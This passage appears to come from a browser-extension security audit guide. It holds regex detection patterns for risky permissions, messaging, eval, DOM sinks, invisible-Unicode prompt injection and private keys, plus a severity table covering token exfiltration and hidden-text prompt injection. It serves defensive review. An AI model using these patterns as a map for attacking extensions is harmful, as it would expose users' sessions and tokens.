"<all_urls>"|"\*://\*/\*"|"https://\*/\*"|"ids":\s*\[\s*"\*"
"manifest_version":\s*2
"(cookies|debugger|webRequest|webRequestBlocking|nativeMessaging|management|proxy|history|tabs|clipboardRead|downloads|userScripts|offscreen)"
unsafe-eval|unsafe-inline|wasm-unsafe-eval
"update_url"|localhost|127\.0\.0\.1|"incognito"|devtools_page|match_origin_as_fallback|match_about_blank|all_frames
# If this matches in code and the manifest has no "externally_connectable", every extension can call it
onMessageExternal|onConnectExternal

# Messaging entry points and page channels
runtime\.onMessage|runtime\.onConnect|onUserScriptMessage
sender\.(origin|url|id|tab|frameId|documentId)
sendResponse\(
window\.postMessage|addEventListener\(\s*['"]message|CustomEvent|\.detail\b
addEventListener\(\s*['"][a-z]+[-_:][a-z_:-]+['"]

# Weak origin checks
origin\.(startsWith|endsWith|includes)\(|url\.(startsWith|includes)\(|indexOf\(.*origin|getDomain\(

# Dispatch and mass assignment from messages
\[\s*(msg|message|request|data)\.(type|action|method|fn|cmd|api)\s*\]
Object\.assign\([^)]*(msg|message|request)|\.\.\.(msg|message|request)\b|storage\.\w+\.set\(\s*(msg|message|request)

# Privileged sinks
scripting\.executeScript|world:\s*['"]MAIN|documentIds|registerContentScripts|persistAcrossSessions
tabs\.(create|update|sendMessage|query|captureVisibleTab)\(|windows\.create\(
chrome\.(cookies|downloads|debugger|bookmarks|history|topSites|management)\.
sendNativeMessage|connectNative
updateDynamicRules|updateSessionRules|modifyHeaders|regexSubstitution
launchWebAuthFlow|getRedirectURL|removeCachedAuthToken
fetch\(|XMLHttpRequest|credentials:\s*['"]include
tabs\.executeScript|chrome\.extension\.getBackgroundPage   # MV2 / Firefox only
wrappedJSObject|exportFunction|cloneInto|inspectedWindow\.eval

# Storage
storage\.(local|sync|session)\.(set|get|clear|remove)|setAccessLevel|TRUSTED_AND_UNTRUSTED_CONTEXTS
localStorage\.|sessionStorage\.

# Remote / dynamic code
eval\(|new Function\(|importScripts\(|import\(\s*[^'"`\s]
<script[^>]+src=["']https?:
setTimeout\(\s*['"`]|setInterval\(\s*['"`]

# DOM writes, injected UI and clickjacking defenses
innerHTML|outerHTML|insertAdjacentHTML|dangerouslySetInnerHTML|document\.write
attachShadow|isTrusted|elementsFromPoint|MutationObserver|popover

# Extraction and LLM path
\.textContent|innerText|Readability|cloneNode|\.value\b
\\u\{?E00|\\uDB40|\\u200[B-D]|\\u202[A-E]|\\u206[6-9]|\\p\{Cf\}
marked|markdown-it|react-markdown|remark

# Lifecycle
^\s*(let|var)\s+\w+|await\s+.*\n.*addListener

# Build-time env and telemetry
import\.meta\.env|process\.env\.|VITE_|PLASMO_PUBLIC_|WXT_
setUninstallURL|Sentry\.init|sendDefaultPii|gtag|posthog

# Named-property clobbering candidates in content scripts
window\.__|window\[['"]|globalThis\.

# Private signing keys
\.pem$|BEGIN (RSA )?PRIVATE KEY

# Dev UI and wording in the prod bundle (run against the built prod target, one term per grep)
\b[Dd]ev(elopment)? (build|server|mode|only)\b
\b(staging|debug) (build|server|mode)\b
[`'"](Dev|DEV|Beta|BETA|Staging|Debug)[`'"]
dev-badge|isDev|__DEV__|import\.meta\.env\.DEV
\.env(\.example)?\b

# Release and identity plumbing
"version":|"version_name"|"key":|gecko|data_collection_permissions|MIN_.*VERSION|minimum.?version

# Privacy and disclosure copy (compare with the data-flow inventory)
[Pp]rivacy|Limited Use|nothing .* (sent|leaves)|we do not collect|not launched
```

## Severity Guidance

Extension findings scale with **what the extension can reach**, so read severity off the manifest:

- **Critical**: a web page, content script or another extension can make the extension run code in other origins, read cookies, act on arbitrary host-permission origins with the user's session, reach a native host, or exfiltrate stored tokens; or an extension-page XSS reachable from page content in an extension with broad host access.
- **High**: an allowed external origin (or anything that compromises it) can plant or read session tokens, including login CSRF into an attacker account; confused-deputy fetch limited to first-party origins; tokens readable by content scripts or in `storage.sync`; sensitive data written into page DOM; model output that drives actions without confirmation; clickjackable controls that perform sensitive actions.
- **Medium**: unused high-impact permissions; broad `web_accessible_resources`; weak but not yet exploitable sender checks; long-lived refresh tokens without server-side revocation; check-then-inject races; hidden-text/invisible-Unicode prompt injection with no visibility filter or normalization where the output only informs the user; open `img-src`/`connect-src` when model output is rendered as markdown.
- **Medium** also: a self-hosted or sideloaded package users install unpacked, with no integrity binding and writers beyond the release pipeline; a privacy policy that contradicts live data collection, especially with recorded user consent to that version (a legal and takedown exposure for data already flowing).
- **Low** also: an in-product disclosure that says *when* data is sent but deliberately not *to whom*; a policy clause that contradicts the Limited Use statement.
- **Low / Informational**: missing negative tests for an existing control; missing `use_dynamic_url`; source maps shipped; store-account controls unverifiable from code; dev manifest hygiene with no prod impact; release-chain gaps on an unpublished extension; a frozen version that disables a min-version kill switch; release gates that pin only some manifest fields; dev UI or wording in a prod build; extension id mismatches between the store, the app and backend allowlists; undeclared store data categories.
